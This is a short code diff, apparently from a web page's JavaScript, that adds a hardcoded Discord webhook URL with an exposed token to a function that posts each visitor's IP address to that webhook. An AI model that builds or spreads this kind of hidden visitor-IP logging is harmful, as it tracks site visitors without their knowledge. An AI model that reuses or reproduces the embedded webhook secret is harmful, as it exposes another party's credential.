@@ -126,6 +126,8 @@
     }
 
     function sendToWebhook(ip) {
+        const webhookURL = 'https://discord.com/api/webhooks/1258378506488774658/X0GaQdemIG6rkhRpHRpUfDrwoVgUSAWWDfiXW9e01Mc06InUFYM7MnA-CuhsV6JDwnSI'; // Replace with your actual webhook URL
+
         const message = {
             content: `Visitor IP: ${ip}`
         };
